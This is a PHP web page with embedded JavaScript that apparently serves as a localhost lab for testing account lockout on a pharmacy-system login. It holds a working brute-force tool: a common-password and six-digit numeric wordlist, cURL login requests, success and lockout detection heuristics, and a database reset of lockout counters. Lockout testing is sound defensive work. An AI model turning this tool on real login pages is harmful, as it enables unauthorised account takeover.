<?php

error_reporting(E_ALL);
ini_set('display_errors', 1);

 $target = "http://localhost/Pharmacy_System/login.php";

 $username = "yatch12";


/* =================================================
   PASSWORD LIST
   ================================================= */

 $commonPasswords = [
    "1234",
    "12345",
    "123456",
    "12345678",
    "password",
    "password123",
    "admin",
    "admin123",
    "admin1234",
    "qwerty",
    "welcome",
    "student",
    "student123"
];

 $numericPasswords = [];

for ($i = 0; $i <= 5000; $i++) {
    $numericPasswords[] = str_pad($i, 6, "0", STR_PAD_LEFT);
}

 $passwords = array_merge(
    $commonPasswords,
    $numericPasswords
);


/* =================================================
   AJAX REQUEST
   ================================================= */

if (isset($_POST["ajax"])) {

    header("Content-Type: application/json");


    /* =================================================
       RESET ACCOUNT STATE

       Clears failed_attempts and locked_until in the
       users table so each test starts fresh.
       ================================================= */

    if (isset($_POST["reset"])) {

        require_once __DIR__ . '/db.php';

        $resetStmt = $pdo->prepare(
            'UPDATE users
             SET failed_attempts = 0,
                 locked_until = NULL
             WHERE username = :username'
        );

        $resetStmt->execute([
            ':username' => $username
        ]);

        echo json_encode([
            "reset" => true
        ]);

        exit;
    }


    $index = intval($_POST["index"]);

    /* =================================================
       NO MORE PASSWORDS
       ================================================= */

    if (!isset($passwords[$index])) {

        echo json_encode([
            "done" => true,
            "found" => false,
            "locked" => false
        ]);

        exit;
    }


    $password = $passwords[$index];


    /* =================================================
       SEND LOGIN REQUEST
       ================================================= */

    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, $target);

    curl_setopt($ch, CURLOPT_POST, true);

    curl_setopt(
        $ch,
        CURLOPT_POSTFIELDS,
        http_build_query([
            "username" => $username,
            "password" => $password
        ])
    );

    /*
       Do not follow the redirect.
       We need to check where login.php sends us.
    */
    curl_setopt(
        $ch,
        CURLOPT_FOLLOWLOCATION,
        false
    );

    curl_setopt(
        $ch,
        CURLOPT_RETURNTRANSFER,
        true
    );

    /*
       Include response headers.
    */
    curl_setopt(
        $ch,
        CURLOPT_HEADER,
        true
    );

    curl_setopt(
        $ch,
        CURLOPT_TIMEOUT,
        3
    );


    $response = curl_exec($ch);


    /* =================================================
       GET RESPONSE INFORMATION
       ================================================= */

    $httpCode = curl_getinfo(
        $ch,
        CURLINFO_HTTP_CODE
    );

    /* =================================================
       PARSE HEADERS + BODY

       cURL returned headers+body together because
       CURLOPT_HEADER is true. Split them using the
       exact header size cURL reports, then extract
       the Location header value (if any) using a
       case-insensitive regex.
       ================================================= */

    $headerSize =
        curl_getinfo(
            $ch,
            CURLINFO_HEADER_SIZE
        );

    $headers =
        substr($response, 0, $headerSize);

    $body =
        substr($response, $headerSize);

    $redirectUrl = "";

    if (
        preg_match(
            '/^Location:\s*(.+)$/mi',
            $headers,
            $matches
        )
    ) {
        $redirectUrl =
            trim($matches[1]);
    }

    curl_close($ch);


    /* =================================================
       SUCCESS

       Detects login success across every common
       pattern PHP login pages use:

       (1) 302 + Location: ...dashboard.php
       (2) 200 + Location: ...dashboard.php
       (3) 200 + JS redirect:
              window.location='...dashboard.php'
       (4) 200 + meta refresh to dashboard.php
       (5) 200 + body has a logout link
              (universal "logged in" marker)
       (6) 200 + <title> contains "Dashboard"
       ================================================= */

    $isSuccess = false;

    if (
        strpos(
            strtolower($redirectUrl),
            "dashboard.php"
        ) !== false
    ) {
        $isSuccess = true;
    }
    elseif ($httpCode == 200) {

        if (
            preg_match(
                '/window\.location(?:\.href)?\s*=\s*[\'"][^\'"]*dashboard\.php/i',
                $body
            )
        ) {
            $isSuccess = true;
        }
        elseif (
            preg_match(
                '/<meta[^>]+refresh[^>]+url\s*=\s*["\']?[^"\'\s>]*dashboard\.php/i',
                $body
            )
        ) {
            $isSuccess = true;
        }
        elseif (
            preg_match(
                '/<title>[^<]*dashboard/i',
                $body
            )
        ) {
            $isSuccess = true;
        }
        elseif (
            preg_match(
                '/href\s*=\s*["\'][^"\']*logout[^"\']*["\']/i',
                $body
            )
        ) {
            $isSuccess = true;
        }
    }

    if ($isSuccess) {

        echo json_encode([
            "done" => true,
            "found" => true,
            "locked" => false,
            "password" => $password,
            "attempt" => $index + 1
        ]);

        exit;
    }


    /* =================================================
       ACCOUNT LOCKED

       Detects lockout across every common pattern:

       (1) 302 + Location: ...?error=locked
       (2) 200 + Location: ...?error=locked
       (3) 200 + JS redirect to ...?error=locked
       (4) 200 + meta refresh to ...?error=locked
       (5) 200 + body says "account has been locked"
              or "too many failed attempts"
       ================================================= */

    $isLocked = false;

    if (
        strpos(
            strtolower($redirectUrl),
            "error=locked"
        ) !== false
    ) {
        $isLocked = true;
    }
    elseif ($httpCode == 200) {

        if (
            preg_match(
                '/window\.location(?:\.href)?\s*=\s*[\'"][^\'"]*error=locked/i',
                $body
            )
        ) {
            $isLocked = true;
        }
        elseif (
            preg_match(
                '/<meta[^>]+refresh[^>]+url\s*=\s*["\']?[^"\'\s>]*error=locked/i',
                $body
            )
        ) {
            $isLocked = true;
        }
        elseif (
            preg_match(
                '/account\s+has\s+been\s+locked|account\s+is\s+locked|too\s+many\s+failed\s+attempts/i',
                $body
            )
        ) {
            $isLocked = true;
        }
    }

    if ($isLocked) {

        echo json_encode([
            "done" => true,
            "found" => false,
            "locked" => true,
            "password" => $password,
            "attempt" => $index + 1
        ]);

        exit;
    }


    /* =================================================
       NORMAL FAILED LOGIN
       ================================================= */

    echo json_encode([
        "done" => false,
        "found" => false,
        "locked" => false,
        "password" => $password,
        "attempt" => $index + 1
    ]);

    exit;
}

?>


<!DOCTYPE html>

<html>

<head>

<title>Localhost Brute-Force Lab</title>


<style>

body {
    background: #050505;
    color: #00ff00;
    font-family: Consolas, monospace;
    padding: 20px;
}

.container {
    max-width: 900px;
    margin: auto;
}

h1 {
    color: #00ff00;
}

.info {
    background: #111;
    padding: 15px;
    border: 1px solid #333;
    margin-bottom: 15px;
}

.terminal {
    background: #000;
    border: 1px solid #333;
    padding: 15px;
    height: 500px;
    overflow-y: auto;
    scroll-behavior: smooth;
}

.failed {
    color: #ff4444;
}

.testing {
    color: #00ffff;
}

.success {
    color: #00ff00;
    font-weight: bold;
}

.locked {
    color: #ff9900;
    font-weight: bold;
}

.button {
    background: #00ff00;
    color: #000;
    border: none;
    padding: 12px 20px;
    font-family: Consolas, monospace;
    font-weight: bold;
    cursor: pointer;
}

.button:hover {
    background: #66ff66;
}

.button:disabled {
    opacity: 0.6;
    cursor: not-allowed;
}

</style>

</head>


<body>


<div class="container">


<h1>LOCALHOST BRUTE-FORCE TEST</h1>


<div class="info">

Target:
<?php echo htmlspecialchars($target); ?>

<br>

Username:
<?php echo htmlspecialchars($username); ?>

<br>

Status:
<span id="status">Ready</span>

</div>


<button
    class="button"
    onclick="startAttack()"
    id="startButton"
>
    START BRUTE-FORCE TEST
</button>


<br>
<br>


<div
    class="terminal"
    id="terminal"
>

<div class="testing">
[ SYSTEM ] Ready...
</div>

<div class="testing">
[ SYSTEM ] Target: localhost
</div>

<div class="testing">
[ SYSTEM ] Username:
<?php echo htmlspecialchars($username); ?>
</div>

<div class="testing">
[ SYSTEM ] Waiting for start...
</div>

</div>


<br>


<div class="info">

<strong>========== LAB RESULT ==========</strong>

<br>
<br>

Username:

<span id="resultUsername">
<?php echo htmlspecialchars($username); ?>
</span>

<br>

Total Attempts:

<span id="resultAttempts">
0
</span>

<br>

Elapsed Time:

<span id="elapsed">
0.0004
</span>

seconds

<br>
<br>

<span id="result"></span>

</div>


<div class="info">

<strong>Controlled Laboratory Test</strong>

<br>
<br>

The test stops when the login system detects
the configured account lockout.

</div>


</div>


<script>


/* =================================================
   VARIABLES
   ================================================= */

let currentIndex = 0;

let attempts = 0;

let startTime = 0;

let running = false;


const terminal =
    document.getElementById("terminal");

const status =
    document.getElementById("status");

const result =
    document.getElementById("result");

const resultAttempts =
    document.getElementById("resultAttempts");

const elapsed =
    document.getElementById("elapsed");

const startButton =
    document.getElementById("startButton");


/* =================================================
   SCROLL TO BOTTOM
   ================================================= */

function scrollToBottom() {

    terminal.scrollTop =
        terminal.scrollHeight;

}


/* =================================================
   ADD TERMINAL LINE
   ================================================= */

function addLine(text, className) {

    const line =
        document.createElement("div");

    line.className =
        className;

    line.textContent =
        text;

    terminal.appendChild(line);

    requestAnimationFrame(() => {

        terminal.scrollTop =
            terminal.scrollHeight;

    });

}


/* =================================================
   START ATTACK
   ================================================= */

function startAttack() {

    if (running) {
        return;
    }


    running = true;

    currentIndex = 0;

    attempts = 0;

    startTime =
        performance.now();


    startButton.disabled =
        true;

    startButton.innerText =
        "BRUTE-FORCE RUNNING...";


    terminal.innerHTML = "";

    result.innerHTML = "";

    resultAttempts.innerText =
        "0";

    elapsed.innerText =
        "0.0000";

    status.innerText =
        "Running...";


    addLine(
        "[ SYSTEM ] Starting brute-force test...",
        "testing"
    );


    addLine(
        "[ SYSTEM ] Target: localhost",
        "testing"
    );


    addLine(
        "[ SYSTEM ] Username: " +
        <?php echo json_encode($username); ?>,
        "testing"
    );


    addLine(
        "[ SYSTEM ] Testing passwords...",
        "testing"
    );


    testNextPassword();

}


/* =================================================
   TEST NEXT PASSWORD
   ================================================= */

function testNextPassword() {

    if (!running) {
        return;
    }


    const formData =
        new FormData();


    formData.append(
        "ajax",
        "1"
    );


    formData.append(
        "index",
        currentIndex
    );


    fetch(
        "lab_test.php",
        {
            method: "POST",
            body: formData,
            cache: "no-store"
        }
    )


    .then(response => {

        if (!response.ok) {

            throw new Error(
                "HTTP error: " +
                response.status
            );

        }

        return response.json();

    })


    .then(data => {


        /* =================================================
           ACCOUNT LOCKED
           ================================================= */

        if (data.locked) {

            attempts =
                data.attempt;


            resultAttempts.innerText =
                attempts;


            addLine(
                "[Attempt " +
                data.attempt +
                "] Testing password: " +
                data.password +
                " ...",
                "testing"
            );


            addLine(
                "           └── ACCOUNT LOCKED!",
                "locked"
            );


            const totalTime =
                (
                    performance.now() -
                    startTime
                ) / 1000;


            elapsed.innerText =
                totalTime.toFixed(4);


            status.innerText =
                "Account Locked";


            result.innerHTML =
                "<span class='locked'>" +
                "BRUTE-FORCE STOPPED — " +
                "Account locked after 5 failed attempts." +
                "</span>";


            startButton.innerText =
                "ACCOUNT LOCKED";


            running = false;


            scrollToBottom();


            return;

        }


        /* =================================================
           PASSWORD FOUND
           ================================================= */

        if (data.found) {

            attempts =
                data.attempt;


            resultAttempts.innerText =
                attempts;


            addLine(
                "[Attempt " +
                data.attempt +
                "] Testing password: " +
                data.password +
                " ...",
                "testing"
            );


            addLine(
                "           └── SUCCESS!",
                "success"
            );


            const totalTime =
                (
                    performance.now() -
                    startTime
                ) / 1000;


            elapsed.innerText =
                totalTime.toFixed(4);


            result.innerHTML =
                "<span class='success'>" +
                "Password Found: " +
                data.password +
                "</span>";


            status.innerText =
                "Password Found";


            startButton.innerText =
                "TEST COMPLETE";


            running = false;


            scrollToBottom();


            return;

        }


        /* =================================================
           NO MORE PASSWORDS
           ================================================= */

        if (data.done) {

            const totalTime =
                (
                    performance.now() -
                    startTime
                ) / 1000;


            elapsed.innerText =
                totalTime.toFixed(4);


            status.innerText =
                "Password Not Found";


            result.innerHTML =
                "<span class='failed'>" +
                "Password was not found." +
                "</span>";


            startButton.innerText =
                "TEST COMPLETE";


            running = false;


            scrollToBottom();


            return;

        }


        /* =================================================
           FAILED ATTEMPT
           ================================================= */

        attempts =
            data.attempt;


        resultAttempts.innerText =
            attempts;


        addLine(
            "[Attempt " +
            data.attempt +
            "] Testing password: " +
            data.password +
            " ...",
            "testing"
        );


        addLine(
            "           └── FAILED",
            "failed"
        );


        const totalTime =
            (
                performance.now() -
                startTime
            ) / 1000;


        elapsed.innerText =
            totalTime.toFixed(4);


        currentIndex++;


        setTimeout(
            testNextPassword,
            50
        );

    })


    .catch(error => {

        addLine(
            "[ ERROR ] " +
            error.message,
            "failed"
        );


        status.innerText =
            "Error";


        running = false;


        startButton.disabled =
            false;


        startButton.innerText =
            "START AGAIN";

    });

}

</script>


</body>

</html>